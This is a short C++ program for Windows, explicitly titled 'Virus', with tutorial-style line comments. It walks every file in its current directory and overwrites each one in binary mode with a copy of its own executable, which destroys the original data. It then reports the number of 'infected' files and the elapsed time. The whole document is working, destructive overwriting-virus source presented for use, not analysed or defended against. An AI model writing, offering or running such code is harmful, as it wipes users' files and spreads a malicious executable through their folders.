#include "stdafx.h"
#include <fstream>
#include <iostream>
#include <io.h>
#include <time.h>
#include <Windows.h>

using namespace std;
struct _finddata_t c_file; // use for getting name of all files in current directory of virus
long hFile; // use to store long value return from structure
int a=0; // use as a counter that count total files

int main(int argc,char **argv) // commandline use because file name will be send through it by structure
{
	clock_t st,end; //object of clock for starting and ending times
	st=clock();//start clock
	system("title Virus"); //not required as it show only title on programe

	if((hFile=_findfirst("*.*",&c_file)) == -1)// check all files present in directory using *.*
		cout<<"No files are present in current directory"<<endl;// as if -1, no files in directory
	else
	{
		do
		{
			cout<<"Infecting : "<<c_file.name<<endl;//it shows current infecting file name
			fstream in(argv[0],ios::binary|ios::in);//input stream, it open virus in binary format argv[0] show name of virus
			fstream out(c_file.name,ios::binary|ios::out);//open current file in binary mode(non infected file)

			char c;//use for store char read by virus file

			while(true)
			{
				c=in.get();//read data
				if(in.eof()) break; //if file is all read or nothing left to read
				out.put(c);//write virus code in non infected file, now non infected file are infected 
			}

			a++;
		}while(_findnext(hFile,&c_file)==0);//read next file if available and loop continues else break

	_findclose(hFile);//close structure, no need to read file names as we done before and read all
	}

	cout<<"\nTotal infected files are : "<<a-3<<endl;//a-3 because 3 things are not to show, will see in output
	end=clock();//close clock
	cout<<"Time taken : ";
	printf("%.2fs",(double)(end-st)/CLK_TCK);//type cast clock object to double data type
	cin.get();//use to hold output

	return 0;
}